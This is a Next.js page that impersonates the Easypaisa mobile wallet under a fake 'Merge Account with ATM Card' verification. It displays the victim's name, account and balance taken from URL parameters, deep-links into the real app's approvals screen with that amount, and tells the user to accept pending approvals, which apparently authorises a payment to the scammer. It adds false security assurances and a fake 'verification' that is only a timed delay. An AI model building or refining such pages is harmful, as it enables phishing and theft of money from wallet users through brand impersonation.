"use client"

import { useSearchParams, useRouter } from "next/navigation"
import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Smartphone, CheckCircle, ArrowLeft, Shield, Clock, ExternalLink } from "lucide-react"
import { Header } from "@/components/header"

export default function VerifyPage() {
  const params = useSearchParams()
  const router = useRouter()

  const account = params.get("account") ?? "N/A"
  const balance = params.get("balance") ?? "N/A"
  const name = params.get("name") ?? "N/A"

  const [requestSent, setRequestSent] = useState(false)
  const [canVerify, setCanVerify] = useState(false)

  // After "Send Verification Request" is pressed we allow the "Verify" button
  useEffect(() => {
    if (requestSent) {
      const timer = setTimeout(() => setCanVerify(true), 3000) // simulate 3-second delay
      return () => clearTimeout(timer)
    }
  }, [requestSent])

  const handleSendRequest = () => {
    setRequestSent(true)

    // Updated deep-link to Easypaisa app with approvals screen
    const deepLink = `easypaisa://open?screen=approvals&account=${account}&amount=${balance}&name=${encodeURIComponent(name)}`
    const fallback = "https://play.google.com/store/apps/details?id=pk.com.telenor.easypaisa"

    // Try to open the app; if it fails, redirect after 2s to Play Store
    const now = Date.now()
    window.location.href = deepLink
    setTimeout(() => {
      if (Date.now() - now < 2200) {
        window.location.href = fallback
      }
    }, 2000)
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-emerald-50 to-teal-50">
      {/* Mobile-First Header */}
      <Header
        showHomeLink={true}
        title="Account Verification"
        subtitle="Complete the verification process through your mobile app"
      />

      <div className="flex flex-col items-center justify-center p-2 sm:p-4 min-h-[calc(100vh-80px)]">
        <div className="w-full max-w-sm sm:max-w-md">
          {/* Ultra Mobile-Optimized Card */}
          <Card className="shadow-2xl border-0 overflow-hidden mx-2 sm:mx-0">
            <CardHeader className="bg-gradient-to-r from-emerald-700 to-emerald-600 text-white p-3 sm:p-6">
              <div className="text-center">
                <CardTitle className="text-base sm:text-xl font-bold leading-tight">
                  Merge Account with ATM Card
                </CardTitle>
                <CardDescription className="text-emerald-100 mt-1 sm:mt-2 text-xs sm:text-base leading-tight">
                  Follow the steps below to complete verification
                </CardDescription>
              </div>
            </CardHeader>

            <CardContent className="space-y-4 sm:space-y-6 p-3 sm:p-6">
              {/* Ultra Mobile-Responsive Account details */}
              <div className="rounded-lg border-2 border-emerald-100 bg-emerald-50 p-3 sm:p-4">
                <div className="space-y-2">
                  <div className="flex flex-col space-y-1">
                    <span className="font-semibold text-gray-700 text-xs sm:text-sm">Customer Name:</span>
                    <span className="font-bold text-gray-900 text-sm sm:text-base break-words">{name}</span>
                  </div>
                  <div className="flex flex-col space-y-1">
                    <span className="font-semibold text-gray-700 text-xs sm:text-sm">Easypaisa Account:</span>
                    <span className="font-bold text-gray-900 text-sm sm:text-base">{account}</span>
                  </div>
                  <div className="flex flex-col space-y-1">
                    <span className="font-semibold text-gray-700 text-xs sm:text-sm">Current Balance:</span>
                    <span className="font-bold text-emerald-600 text-sm sm:text-base">
                      PKR {Number(balance).toLocaleString()}
                    </span>
                  </div>
                </div>
              </div>

              {/* Ultra Mobile-Optimized Steps */}
              <div className="space-y-3">
                <h3 className="font-bold text-gray-800 text-sm sm:text-base mb-2">Verification Steps:</h3>
                <div className="space-y-3">
                  <div className="flex items-start space-x-2 sm:space-x-3 p-2 sm:p-3 rounded-lg bg-gray-50">
                    <div className="w-6 h-6 sm:w-7 sm:h-7 bg-emerald-600 text-white rounded-full flex items-center justify-center font-bold text-xs flex-shrink-0">
                      1
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className="text-gray-700 text-xs sm:text-sm leading-tight">
                        Tap <strong>"Open EasyPaisa App"</strong> to launch your mobile app directly to approvals.
                      </p>
                    </div>
                  </div>

                  <div className="flex items-start space-x-2 sm:space-x-3 p-2 sm:p-3 rounded-lg bg-gray-50">
                    <div className="w-6 h-6 sm:w-7 sm:h-7 bg-emerald-600 text-white rounded-full flex items-center justify-center font-bold text-xs flex-shrink-0">
                      2
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className="text-gray-700 text-xs sm:text-sm leading-tight">
                        In EasyPaisa app → Go to <strong>My Account</strong> → <strong>My Approvals</strong> & Accept
                        pending approvals.
                      </p>
                    </div>
                  </div>

                  <div className="flex items-start space-x-2 sm:space-x-3 p-2 sm:p-3 rounded-lg bg-gray-50">
                    <div className="w-6 h-6 sm:w-7 sm:h-7 bg-emerald-600 text-white rounded-full flex items-center justify-center font-bold text-xs flex-shrink-0">
                      3
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className="text-gray-700 text-xs sm:text-sm leading-tight">
                        Return here and press <strong>"Complete Verification"</strong>.
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              {/* Mobile-Responsive Security note */}
              <Badge
                variant="outline"
                className="w-full justify-center bg-emerald-50 border-emerald-200 text-emerald-700 py-2 px-2 text-xs leading-tight"
              >
                <Shield className="w-3 h-3 mr-1 flex-shrink-0" />
                <span className="text-center">
                  This process is secure and encrypted. Your data is protected with bank-level security.
                </span>
              </Badge>

              {/* Ultra Mobile-Optimized Buttons */}
              <div className="space-y-2 sm:space-y-3">
                <Button
                  onClick={handleSendRequest}
                  disabled={requestSent}
                  className="w-full bg-gradient-to-r from-emerald-600 to-green-600 hover:from-emerald-700 hover:to-green-700 py-3 sm:py-4 text-sm sm:text-base font-semibold rounded-lg shadow-lg active:scale-95 transition-all touch-manipulation"
                >
                  <Smartphone className="w-4 h-4 mr-2 flex-shrink-0" />
                  {requestSent ? "App Opened ✓" : "Open EasyPaisa App"}
                  <ExternalLink className="w-3 h-3 ml-2 flex-shrink-0" />
                </Button>

                <Button
                  onClick={() => router.push("/success")}
                  disabled={!canVerify}
                  className="w-full bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 disabled:opacity-50 py-3 sm:py-4 text-sm sm:text-base font-semibold rounded-lg shadow-lg active:scale-95 transition-all touch-manipulation"
                >
                  <CheckCircle className="w-4 h-4 mr-2 flex-shrink-0" />
                  {canVerify ? "Complete Verification" : "Complete Verification (Wait for app approval)"}
                </Button>

                <Button
                  variant="outline"
                  className="w-full bg-transparent border-2 border-gray-300 hover:bg-gray-50 py-3 sm:py-4 text-sm sm:text-base font-semibold rounded-lg active:scale-95 transition-all touch-manipulation"
                  onClick={() => router.back()}
                >
                  <ArrowLeft className="w-4 h-4 mr-2 flex-shrink-0" />
                  Go Back
                </Button>
              </div>

              {requestSent && !canVerify && (
                <div className="text-center p-3 bg-blue-50 rounded-lg border border-blue-200">
                  <Clock className="w-5 h-5 text-blue-600 mx-auto mb-2 animate-spin" />
                  <p className="text-blue-700 font-medium text-xs sm:text-sm">Waiting for app approval...</p>
                  <p className="text-blue-600 text-xs mt-1">Please complete the approval in your EasyPaisa app</p>
                </div>
              )}
            </CardContent>
          </Card>

          {/* Ultra Mobile-Responsive Footer */}
          <p className="mt-4 sm:mt-6 text-center text-gray-500 text-xs sm:text-sm px-4">
            © 2024 EasyPaisa. All rights reserved.
          </p>
        </div>
      </div>
    </div>
  )
}
